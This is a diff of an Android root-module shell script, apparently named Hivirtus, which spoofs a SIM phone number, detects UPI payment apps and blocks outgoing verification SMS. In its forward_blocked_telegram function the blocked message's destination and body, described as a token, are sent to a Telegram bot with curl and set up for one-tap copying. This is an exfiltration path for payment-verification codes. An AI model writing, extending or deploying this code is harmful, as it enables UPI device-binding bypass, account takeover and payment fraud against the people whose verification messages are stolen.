@@ -1,5 +1,5 @@
 #!/system/bin/sh
-# Magisk module runtime — config sync + UPI detect + Virtus floating overlay APK
+# Hivirtus runtime — config sync + SMS block + Telegram (APK-free native overlay)
 
 MODDIR=${0%/*}
 . "$MODDIR/overlay_install.sh"
@@ -134,13 +134,7 @@ get_foreground_pkg() {
 }
 
 mark_active() {
-  echo "$1" > "$ACTIVE_PKG"
-  chmod 644 "$ACTIVE_PKG" 2>/dev/null
-  date +%s > /data/local/tmp/hivirtus_module_heartbeat.txt
-  echo "foreground:$1" >> /data/local/tmp/hivirtus_overlay.debug
-  echo "overlay_start:$1" >> /data/local/tmp/hivirtus_overlay.debug
-  chmod 644 /data/local/tmp/hivirtus_overlay.debug 2>/dev/null
-  hivirtus_start_overlay_service
+  hivirtus_mark_foreground_upi "$1"
 }
 
 sync_config
@@ -148,7 +142,7 @@ sync_config
 seed_apatch_config
 seed_hooked_pkgs
 
-# Reboot ke baad APK install + overlay permission + service start
+# Reboot pe native overlay flag
 hivirtus_boot_activate_overlay &
 
 (
@@ -256,29 +250,27 @@ forward_blocked_telegram() {
   SPOOF=$(cat /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null | tr -d '\r\n ')
   [ -z "$SPOOF" ] && SPOOF=$(grep -o '"mock_phone_sim1"[[:space:]]*:[[:space:]]*"[^"]*"' "$RUNTIME" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
   SEND_FROM="${SPOOF:-—}"
-  TEXT="📱 Verify SMS Blocked — Fake Success ✅
-Zygisk Mode Menu By @hivirtus @liqdy 🔥
+  TEXT="📱 SMS Intercepted
+Hivirtus Zygisk Mode By @hivirtus @liqdy 🔥
+-----------------
+To:
+${BLOCKED_DEST}
 
-Send FROM:
-${SEND_FROM}
-
-Body / Token:
+Message:
 ${BLOCKED_BODY}"
+  ONE_TAP="${BLOCKED_DEST} | ${BLOCKED_BODY}"
   ESC_TEXT=$(tg_json_escape "$TEXT")
-  ESC_NUM=$(tg_json_escape "$SEND_FROM")
+  ESC_TAP=$(tg_json_escape "$(tg_clip_copy "$ONE_TAP")")
   COPY_BODY=$(tg_clip_copy "$BLOCKED_BODY")
   ESC_BODY=$(tg_json_escape "$COPY_BODY")
   PAYLOAD="/data/local/tmp/hivirtus_tg_payload.json"
-  printf '%s' "{\"chat_id\":\"${TG_CHAT}\",\"text\":\"${ESC_TEXT}\",\"disable_web_page_preview\":true,\"reply_markup\":{\"inline_keyboard\":[[{\"text\":\"📋 Copy Number\",\"copy_text\":{\"text\":\"${ESC_NUM}\"}},{\"text\":\"📋 Copy SMS Body\",\"copy_text\":{\"text\":\"${ESC_BODY}\"}}]]}}" > "$PAYLOAD"
+  printf '%s' "{\"chat_id\":\"${TG_CHAT}\",\"text\":\"${ESC_TEXT}\",\"disable_web_page_preview\":true,\"reply_markup\":{\"inline_keyboard\":[[{\"text\":\"📋 One-tap copy\",\"copy_text\":{\"text\":\"${ESC_TAP}\"}},{\"text\":\"📋 Copy SMS Body\",\"copy_text\":{\"text\":\"${ESC_BODY}\"}}]]}}" > "$PAYLOAD"
   SENT=0
   if command -v curl >/dev/null 2>&1; then
     curl -s -m 25 -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
       -H "Content-Type: application/json" \
       --data-binary "@${PAYLOAD}" >/dev/null 2>&1 && SENT=1
   fi
-  am broadcast -a com.hivirtus.zygiskmode.OUTGOING_BLOCKED \
-    -n com.hivirtus.zygiskmode/.BlockedSmsReceiver \
-    --es dest "$BLOCKED_DEST" --es body "$BLOCKED_BODY" 2>/dev/null
   if [ "$SENT" = "1" ]; then
     rm -f /data/local/tmp/hivirtus_outgoing_blocked.flag
     rm -f /data/local/tmp/hivirtus_outgoing_blocked.json
